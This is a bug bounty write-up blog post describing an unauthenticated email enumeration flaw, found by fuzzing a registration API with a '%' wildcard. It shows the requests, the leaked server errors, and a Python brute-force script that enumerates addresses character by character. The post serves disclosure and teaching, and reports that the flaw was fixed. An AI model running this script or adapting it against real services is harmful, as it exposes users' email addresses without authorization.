---
layout: post
title: Unauthenticated Email Enumeration via API Fuzzing
date: 2024-02-21 15:08 +0530
categories: [bugbounty, writeup]
tags: [bugbounty,API,FUZZ] 
---


## Introduction

This blog post explores a recent finding I discovered in a bug bounty target. I stumbled upon a user enumeration issue that exposes email addresses without proper security measures. This vulnerability allows unauthorized users to enumerate all email addresses without authentication or rate limiting, potentially exposing sensitive information.

## Discovery

While testing the registration process, I encountered a POST request to a API endpoint used for email verification in my burp history tab. The endpoint was checking if the email address I entered during registration already existed or not.So i started 
Fuzzing the endpoint `/registration` with fuzzing payloads using intruder, I stumbled upon a 500 error code response when I injected a `%` character into the `userEmail` json parameter. The server returned a 500 Internal Server Error along with a  message

##### Request

```
POST /registration HTTP/2
Host: domain
Content-Type: application/json;charset=UTF-8

{"userEmail":"%"}

```

##### Response

```
There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unable to find com.correnet.matcha.client.model.application.AccessGroup with id 7052; nested exception is javax.persistence.EntityNotFoundException: Unable to find com.correnet.matcha.client.model.application.AccessGroup with id 7052

```
By observing this error message my assumption was the post request  sent to the registration endpoint with the `userEmail` parameter set to `%`. This input triggers a SQL query in the backend to select all records from the users table where the email column matches any value containing the `% ` character. The error message returned from the server indicates that there are 7052 entries in the system, giving insight into the number of user accounts present.Something like,

```sql
SELECT * FROM users WHERE email LIKE "%"
```
Further testing this endpoint i figured out the true and false case for the email address existence

##### False Response Case:
```

HTTP Request Body: {"userEmail":"adamcorta%"}
HTTP Response: "Could not find resource: ApplicationUser identified by adamcorta%"

```
##### True Response Case:
```

HTTP Request: {"userEmail":"adamcorte%"}

HTTP Response: "There was an unexpected error (type=Internal Server Error, status=500).</div><div>Unable to find com.correnet.matcha.client.model.application.AccessGroup with id"

or

HTTP Response: "Anonymous user (not logged in) not authorized for operation: [connect application user to Platform user]"


```


## Exploit

And based on above error messages, I( ChatGPT of course! ) made a wacky Python script to automate the email enumeration:

```python
import requests

def brute_force_attack():
  
    charset = 'abcdefghijklmnopqrstuvwxyz@._'
    initial_string = ''

    last_valid_username = None  
    
    consecutive_errors = 0  
    max_consecutive_errors = 70  
    for initial_char in charset:
        initial_string = initial_char
        while True:
            for char in charset:
                
                payload = initial_string + char + '%'
                response = send_request(payload)

                
                if "500" in response:
                    initial_string += char
                    print(initial_string)
                    break
                elif "403" in response:
                    last_valid_username = payload  
                    print(f"username: {last_valid_username}")
                    initial_string += char
                    consecutive_errors = 0
                    break
                else:
                    
                    consecutive_errors = 0
            else:
                
                consecutive_errors += 1
                if consecutive_errors >= max_consecutive_errors:
                    if last_valid_username is not None:
                        print(f"Last valid username: {last_valid_username}")
                    else:
                        print("No valid username found.")
                    return initial_string
                break  

    else:
        initial_string += charset[0]
    return initial_string



def send_request(payload):
    
    endpoint_url = '{domain}}'  
    url = f"{endpoint_url}/registration"
    headers = {'Content-Type': 'application/json;charset=UTF-8'}
    data = {"userEmail": payload}

    try:
        response = requests.post(url, json=data, headers=headers)
        response.raise_for_status()  
        return response.text
    except requests.exceptions.RequestException as e:
        return str(e)


result = brute_force_attack()
print("The correct username is:", result)
```
In response to this discovery, the program triaged and fixed the vulnerability by implementing input validation and captcha protection to the registration page.